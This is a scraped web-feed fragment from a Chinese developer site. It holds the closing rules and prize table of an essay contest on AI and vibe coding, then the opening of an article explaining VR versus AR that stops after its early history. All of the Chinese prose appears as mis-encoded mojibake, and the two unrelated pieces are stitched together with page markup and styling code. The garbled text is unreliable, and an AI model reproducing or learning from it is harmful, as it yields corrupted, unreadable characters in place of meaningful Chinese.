<p>æœ¬æ¬¡å¾æ–‡æ´»åŠ¨éœ€è¦ç¬¦åˆä¸»é¢˜ï¼Œå¯¹äºæ–‡ç« ç±»å‹ä»¥åŠæ´»åŠ¨å‚ä¸æ–¹å¼ï¼Œæˆ‘ä»¬æœ‰ä»¥ä¸‹å‡ ç‚¹å°è¦æ±‚ã€‚</p>
<ol>
<li>
<p>æ–‡ç« é¡»ä¸º<strong>åŸåˆ›æ–‡ç« </strong>ï¼Œå†…å®¹ç¬¦åˆ<a href="https://juejin.cn/book/6844733795329900551/section/6844733795380232199" target="_blank" title="https://juejin.cn/book/6844733795329900551/section/6844733795380232199">æ˜é‡‘ç¤¾åŒºçš„å†…å®¹æ ‡å‡†å’Œè§„èŒƒ</a>ã€‚</p>
</li>
<li>
<p>æœ¬æ¬¡å¾æ–‡<strong>ä¸é™åˆ¶æ–‡ç« é¢˜æ</strong>ï¼Œå¯ä»¥æ˜¯ä½ å¯¹è¡Œä¸šçš„æ€»ç»“å’Œè§è§£ï¼Œä¹Ÿå¯ä»¥æ˜¯ä½ å¯¹è¡Œä¸šæœªæ¥å‘å±•çš„é¢„æµ‹ï¼Œæœ¬æ¬¡æ´»åŠ¨ä¸æ¥å—ä¸‹é¢å‡ ç§æ–‡ç« ï¼š</p>
<ol>
<li>èµ„æºèšåˆç±»æ–‡ç« ï¼Œä¾‹å¦‚ Awesome-Listï¼›</li>
<li>ç¿»è¯‘ç±»æ–‡ç« å’Œåˆ©ç”¨AIç”Ÿäº§æ–‡ç« ï¼›</li>
<li>ä¸æœ¬æ¬¡ä¸»é¢˜æ— å…³çš„æ–‡ç« ï¼›</li>
<li>å­¦ä¹ ç¬”è®°/çŸ¥è¯†ç‚¹æ±‡æ€»ç±»æ–‡ç« ï¼›</li>
<li>æœ‰å¤±ä¸­ç«‹æ€§ã€å…¬æ­£æ€§çš„å†…å®¹ï¼Œæ¯”å¦‚ç”±å…¬å¸æˆ–è€…å…¬å¸çš„ä»£ç†æœºæ„ï¼ˆå¦‚å…¬å…³å…¬å¸ï¼‰æ‰€æ’°å†™ï¼Œå•çº¯å¸Œæœ›å®£ä¼ è‡ªå·±çš„å•†ä¸šäº§å“æˆ–è€…å…¬å¸çš„å†…å®¹ï¼›</li>
<li>å†…å®¹ä¸æ´»åŠ¨ä¸»é¢˜ä¸ç¬¦ã€éåŸåˆ›å†…å®¹ï¼Œæœ‰æ´—ç¨¿ã€è¥é”€è½¯æ–‡ã€å¹¿å‘Šã€æŠ„è¢­å«Œç–‘çš„æ–‡ç« ã€‚</li>
</ol>
</li>
<li>
<p>åˆ·èµã€åˆ·é‡ç­‰æœ‰ä½œå¼Šè¡Œä¸ºçš„æ–‡ç« ï¼Œç›´æ¥å–æ¶ˆæ¯”èµ›èµ„æ ¼ï¼Œä¸å‚ä¸è¯„é€‰ï¼›</p>
</li>
<li>
<p>AIä»£å†™æ–‡ç« ã€AIèŠå¤©è®°å½•ç­‰ä¸è®¡å…¥æ´»åŠ¨ï¼ˆAIæ£€æµ‹è¶…è¿‡<strong>70%</strong> å–æ¶ˆæ–‡ç« è·å¥–èµ„æ ¼ï¼‰ï¼›</p>
</li>
<li>
<p>æ´»åŠ¨æ–‡ç« éœ€è¦é€‰æ‹©è¯é¢˜ï¼š<a href="https://juejin.cn/theme/detail/7586482726807535666?contentType=1" target="_blank" title="https://juejin.cn/theme/detail/7586482726807535666?contentType=1">juejin.cn/theme/detaiâ€¦</a></p>
</li>
<li>
<p>è·å¥–ä½œå“ï¼Œè‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ï¼Œæ˜é‡‘æ‹¥æœ‰ä½¿ç”¨æƒï¼›</p>
</li>
</ol>
<h3 data-id="heading-6">ğŸ¥‡å¥–é¡¹è®¾ç½®</h3>
<blockquote>
<p><em>æ–‡ç« å°†æ ¹æ®<strong>ä¸“å®¶è¯„å®¡å¾—åˆ†</strong>ï¼ˆå æ¯”70%ï¼‰å’Œ<strong>æ–‡ç« çƒ­åº¦</strong>ï¼ˆå æ¯”30%ï¼‰å¾—åˆ†åŠ æƒè®¡ç®—ã€‚<strong>æœªè·å¾—å®˜æ–¹æ¨è</strong>çš„æ–‡ç« ä¸å‚ä¸å¥–é¡¹è¯„é€‰ã€‚</em></p>
</blockquote>





























































<table><thead><tr><th>å¥–é¡¹åç§°</th><th>å¥–é¡¹è®¾ç½®</th><th>è·å¥–äººæ•°</th><th>å¥–å“åç§°</th><th>å¥–å“å›¾</th></tr></thead><tbody><tr><td><strong>ä¸»èµ›é“</strong></td><td>ä¼˜ç§€æ–‡ç« å¥–ï¼ˆå‰10ç¯‡ï¼‰</td><td>10å</td><td>å°ç†Šï¼ˆBearï¼‰ç”µçƒ§çƒ¤ç‚‰ å¤šåŠŸèƒ½æ–™ç†é”…ç”µçƒ¤ç‚‰ DKL-D12A1</td><td><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfe1f14ebbba4ef4b00c4f1c9f804a58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=LOefUyPyV9SXhsBINQkvGEhqpAM%3D" alt="image.png" loading="lazy"/></td></tr><tr><td/><td>æ˜é‡‘è¾¾äººå¥–ï¼ˆ11-40ç¯‡ï¼‰</td><td>30å</td><td>ç¨€åœŸæ˜é‡‘ YoyoæŠ±æ•æ–°ç‰ˆ-450g</td><td><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0994f46b5f64a0983edcae0dcaf582b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=DonSnRT5C9U7dIixIwf43dc2UpY%3D" alt="" loading="lazy"/></td></tr><tr><td/><td>é˜³å…‰æ™®ç…§å¥–ï¼ˆ41-100ç¯‡ï¼‰</td><td>60å</td><td>ç¨€åœŸæ˜é‡‘ x ByteMall è”åç›²ç›’</td><td><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a503e8c6651439081513b9eebf0e548~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=UFtQfCeSRd%2FzBBrffj0MWkvrHnU%3D" alt="" loading="lazy"/></td></tr><tr><td><strong>TRAEç‰¹åˆ«èµ›é“é¼“åŠ±å¥–ï¼ˆå åŠ ï¼‰</strong></td><td>TOP1-10</td><td>10å</td><td>ä»·å€¼200å…ƒ TRAEè¿å¸½å«è¡£+æŠ±æ•</td><td><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df35e973e984ffabc678b056123c053~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=DdQCjEkPMF1UYfyvmzkc5lmrb04%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9cdcce418454a83810d84be38fcfc78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=roT5Ec8kQZ%2F9dseaDc4xjzmTwME%3D" alt="" loading="lazy"/></td></tr><tr><td/><td>TOP11-30</td><td>20å</td><td>ä»·å€¼100å…ƒ TRAEåœ†é¢†å«è¡£</td><td><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cea27183efa24e44b251b24b35ba9434~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=YvUJU2cEznzamrcswD3GvHH6Fuo%3D" alt="" loading="lazy"/></td></tr><tr><td/><td>TOP31-50</td><td>20å</td><td>ä»·å€¼50å…ƒ TRAEå•è‚©åŒ…</td><td><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/148795305e4248a684ba2a4c95709a06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=mm2GAjRx68fJufHuRJXcnkiw1hc%3D" alt="" loading="lazy"/></td></tr><tr><td/><td>TOP51-100</td><td>50å</td><td>TRAEå°é¼ æ ‡å«</td><td><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23f8a2ea09714ea1ac2d9b8a41ce3248~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596627&amp;x-signature=BnSW%2BBENdrUjAH55aFj3RMaUJAA%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<h2 data-id="heading-7">ğŸ¤µå¾æ–‡å¯¹è±¡</h2>
<p>æ˜é‡‘ç¤¾åŒºå…¨ä½“æ˜å‹</p>
<h2 data-id="heading-8">â°æ´»åŠ¨æ—¶é—´</h2>
<p>2025å¹´12æœˆ26æ—¥â€”â€”2026å¹´1æœˆ25æ—¥23:59</p>
<h2 data-id="heading-9">ğŸ‘€ æ´»åŠ¨Q&amp;A</h2>
<p><strong>Q1ï¼šæŠ•ç¨¿æ•°é‡æœ‰é™åˆ¶å—ï¼Ÿ</strong></p>
<p>Aï¼šæ²¡æœ‰ã€‚</p>
<p><strong>Q2ï¼šä¸€ç¯‡æ–‡ç« å¯ä»¥åŒæ—¶å‚ä¸å¤šä¸ªç¤¾åŒºæ´»åŠ¨å—ï¼Ÿ</strong></p>
<p>Aï¼šä¸è¡Œã€‚ä¸€ç¯‡æ–‡ç« åªèƒ½å‚ä¸ä¸€ä¸ªç¤¾åŒºæ´»åŠ¨ï¼Œå¯ä»¥å†™å¤šç¯‡æ–‡ç« å‚ä¸ä¸åŒçš„æ´»åŠ¨ã€‚</p>
<p><strong>Q3: æœ¬æ¬¡æ´»åŠ¨ä¸­å†™äº†å¤šç¯‡æ–‡ç« ï¼Œå¯ä»¥å¤šæ¬¡è·å¥–å—ï¼Ÿ</strong></p>
<p>Aï¼šå‚åŠ ç‰¹åˆ«èµ›é“çš„æ–‡ç« ï¼ŒåŒæ—¶å‚ä¸ä¸»èµ›é“æ¿€åŠ±æ–‡ç« æ’åï¼Œä¸­å¥–å¥–å“å…¼å¾—ã€‚ä½†æ˜¯ï¼Œä¸»èµ›é“å¥–é¡¹ä¸€ä¸ªç”¨æˆ·åªèƒ½è·å¾—ä¸€æ¬¡ï¼Œå¤šç¯‡æ–‡ç« ä¸Šæ¦œæ—¶é€‰å–æœ€é«˜åæ¬¡è·å¥–ã€‚</p>
<p><strong>Q4ï¼šå¦‚ä½•ç®—æ˜¯æˆåŠŸå‚ä¸äº†æ´»åŠ¨ï¼Ÿ</strong></p>
<p>Aï¼šæ´»åŠ¨æœŸé—´ï¼Œåœ¨æ˜é‡‘å¹³å°å‘å¸ƒ2025 AI/Vibe å¯¹æˆ‘çš„å½±å“å¹´ç»ˆæŠ€æœ¯å¾æ–‡ï¼Œé€‰æ‹©å¸¦è¯é¢˜Â  <strong><a href="https://juejin.cn/theme/detail/7586482726807535666?contentType=1" target="_blank" title="https://juejin.cn/theme/detail/7586482726807535666?contentType=1">#2025 AI/Vibe Coding å¯¹æˆ‘çš„å½±å“#</a></strong> Â ï¼Œå³å¯æˆåŠŸå‚ä¸æ´»åŠ¨ã€‚æ³¨æ„è¯é¢˜â‰ æ ‡ç­¾ï¼</p>
<h3 data-id="heading-10">ğŸ’¡æ³¨æ„äº‹é¡¹</h3>
<p>2026å¹´1æœˆ25æ—¥æ´»åŠ¨ç»“æŸåï¼Œçº¦10-15ä¸ªå·¥ä½œæ—¥é€šè¿‡<strong>ç³»ç»Ÿæ¶ˆæ¯</strong>çš„å½¢å¼å…¬ç¤ºè·å¥–æƒ…å†µï¼Œé¢„è®¡å¡«å†™é—®å·åçš„20ä¸ªå·¥ä½œæ—¥å†…å®Œæˆå¥–å“å‘æ”¾ã€‚</p>
<p>æŠ€æœ¯æµªæ½®å¥”æ¶Œå‘å‰ï¼Œä½†å±äºä¸ªä½“çš„è®°å¿†åŒæ ·çè´µã€‚è®©æˆ‘ä»¬ç”¨æ–‡å­—ï¼Œä¸ºè¿™ä¸å¹³å‡¡çš„ä¸€å¹´æŒ‰ä¸‹å­˜æ¡£é”®ã€‚</p>
<p><strong>æ¥æ˜é‡‘ï¼Œå†™ä¸‹ä½ çš„2025ã€‚ä½ çš„æ•…äº‹ï¼Œæˆ‘ä»¬éƒ½åœ¨å¬ã€‚</strong></p>
<blockquote>
<p>æ³¨ï¼šæœ€ç»ˆè§£é‡Šæƒå½’<em><strong>ç¨€åœŸæ˜é‡‘æŠ€æœ¯ç¤¾åŒº</strong></em> å®˜æ–¹æ‰€æœ‰</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆ"è™šæ‹Ÿç°å®"å’Œ"å¢å¼ºç°å®"ä¸åŒï¼Ÿâ€”â€”ä»è™šæ‹Ÿåˆ°æ··åˆçš„è§†è§‰é©å‘½]]></title>    <link>https://juejin.cn/post/7588971908227432482</link>    <guid>https://juejin.cn/post/7588971908227432482</guid>    <pubDate>2025-12-29T07:20:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588971908227432482" data-draft-id="7588999772749955107" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆ&quot;è™šæ‹Ÿç°å®&quot;å’Œ&quot;å¢å¼ºç°å®&quot;ä¸åŒï¼Ÿâ€”â€”ä»è™šæ‹Ÿåˆ°æ··åˆçš„è§†è§‰é©å‘½"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-29T07:20:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— é™å¤§6"/> <meta itemprop="url" content="https://juejin.cn/user/2865758605422890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆ"è™šæ‹Ÿç°å®"å’Œ"å¢å¼ºç°å®"ä¸åŒï¼Ÿâ€”â€”ä»è™šæ‹Ÿåˆ°æ··åˆçš„è§†è§‰é©å‘½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2865758605422890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— é™å¤§6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:20:23.000Z" title="Mon Dec 29 2025 07:20:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ•¶ï¸ ä¸ºä»€ä¹ˆ"è™šæ‹Ÿç°å®"å’Œ"å¢å¼ºç°å®"ä¸åŒï¼Ÿâ€”â€”ä»è™šæ‹Ÿåˆ°æ··åˆçš„è§†è§‰é©å‘½ ğŸŒˆ</h2>
<blockquote>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯æ— é™å¤§ï¼Œæ¬¢è¿æ”¶çœ‹åä¸‡ä¸ªä¸ºä»€ä¹ˆç³»åˆ—æ–‡ç« </p>
<p>å¸Œæœ›ä»Šå¤©çš„å†…å®¹èƒ½å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©</p>
</blockquote>
<p>ä»Šå¤©å’±ä»¬æ¥èŠèŠVRå’ŒARè¿™ä¸ª"è§†è§‰ç§‘æŠ€çš„åŒç”Ÿå­"ï¼æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æˆ´ç€å¤´æ˜¾åœ¨è™šæ‹Ÿä¸–ç•Œé‡Œæ‰“æ¸¸æˆï¼Œä»¿ä½›èº«ä¸´å…¶å¢ƒï¼›ä½ ç”¨æ‰‹æœºå¯¹ç€æ¡Œå­ï¼Œå±å¹•ä¸Šå‡ºç°ä¸€ä¸ª3Dæ¨¡å‹ï¼Œä»¿ä½›å®ƒçœŸçš„åœ¨æ¡Œå­ä¸Šâ€”â€”è¿™äº›ç‚«é…·çš„ä½“éªŒï¼Œéƒ½æ˜¯VRå’ŒARå¸¦æ¥çš„ï¼ä½†ä½ çŸ¥é“å®ƒä»¬çš„åŒºåˆ«å—ï¼Ÿ</p>
<h3 data-id="heading-1">ğŸ¤” æ ¸å¿ƒé—®é¢˜ï¼šVRå’ŒARçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿå®ƒä»¬çš„æŠ€æœ¯åŸç†å’Œåº”ç”¨åœºæ™¯æœ‰ä½•ä¸åŒï¼Ÿ</h3>
<p>å¾ˆå¤šäººè§‰å¾—VRå’ŒARæ˜¯"ä¸€å›äº‹"ï¼Œå…¶å®å®ƒä»¬å·®åˆ«å¾ˆå¤§ï¼VRå°±åƒ"å®Œå…¨è¿›å…¥å¦ä¸€ä¸ªä¸–ç•Œ"ï¼Œè€ŒARæ˜¯"åœ¨ç°å®ä¸–ç•Œé‡ŒåŠ ä¸œè¥¿"ã€‚ä»Šå¤©å’±ä»¬å°±æ¥æ­å¼€å®ƒä»¬çš„ç¥ç§˜é¢çº±ï¼</p>
<h4 data-id="heading-2">VRå’ŒARçš„æœ¬è´¨</h4>
<ul>
<li>ğŸ® <strong>VRï¼ˆVirtual Realityï¼‰</strong>ï¼šè™šæ‹Ÿç°å®ï¼Œé€šè¿‡å¤´æ˜¾å®Œå…¨æ²‰æµ¸åœ¨è™šæ‹Ÿä¸–ç•Œä¸­ï¼Œä¸ç°å®ä¸–ç•Œéš”ç»</li>
<li>ğŸ” <strong>ARï¼ˆAugmented Realityï¼‰</strong>ï¼šå¢å¼ºç°å®ï¼Œåœ¨ç°å®ä¸–ç•Œçš„åŸºç¡€ä¸Šå åŠ è™šæ‹Ÿå†…å®¹ï¼Œè™šå®ç»“åˆ</li>
<li>ğŸŒ€ <strong>MRï¼ˆMixed Realityï¼‰</strong>ï¼šæ··åˆç°å®ï¼Œè™šæ‹Ÿå†…å®¹ä¸ç°å®ä¸–ç•Œæ·±åº¦èåˆï¼Œèƒ½äº¤äº’</li>
<li>ğŸŒ <strong>XRï¼ˆExtended Realityï¼‰</strong>ï¼šæ‰©å±•ç°å®ï¼Œæ˜¯VRã€ARã€MRçš„æ€»ç§°</li>
</ul>
<h3 data-id="heading-3">ğŸ“œ è§†è§‰æŠ€æœ¯çš„"è¿›åŒ–å²"ï¼šä»æ—©æœŸVRåˆ°XRèåˆ</h3>
<h4 data-id="heading-4">1. ğŸ“º æ—©æœŸVRè®¾å¤‡ï¼š"ç¬¨é‡çš„å¤´ç›”"ï¼ˆ1960s-1990sï¼‰</h4>
<p>1968å¹´ï¼Œä¼Šå‡¡Â·è‹æ³½å…°ï¼ˆIvan Sutherlandï¼‰å‘æ˜äº†ç¬¬ä¸€å°VRå¤´æ˜¾"è¾¾æ‘©å…‹åˆ©æ–¯ä¹‹å‰‘"ï¼ˆSword of Damoclesï¼‰ï¼Œå®ƒé‡è¾¾50å…¬æ–¤ï¼Œéœ€è¦æ‚¬æŒ‚åœ¨å¤©èŠ±æ¿ä¸Šä½¿ç”¨ã€‚</p>
<p>è¿™å°±åƒ"æˆ´äº†ä¸ªç”µè§†æœºåœ¨å¤´ä¸Š"ï¼Œç¬¨é‡åˆä¸å®ç”¨ï¼Œä½†å®ƒå¼€å¯äº†VRçš„å…ˆæ²³ï¼</p>
<h4 data-id="heading-5">2. ğŸ® æ¸¸æˆä¸»æœºæ—¶ä»£ï¼š"å®¶ç”¨VRèŒèŠ½"ï¼ˆ1990s-2010sï¼‰</h4>
<p>1995å¹´ï¼Œä»»å¤©å ‚æ¨å‡ºäº†Virtual Boyï¼Œè¿™æ˜¯ç¬¬ä¸€å°å®¶ç”¨VRæ¸¸æˆæœºã€‚ä½†å®ƒåªæœ‰çº¢è‰²æ˜¾ç¤ºï¼Œé‡é‡å¤§ï¼Œä½“éªŒå·®ï¼Œå¾ˆå¿«å°±å¤±è´¥äº†ã€‚</p>
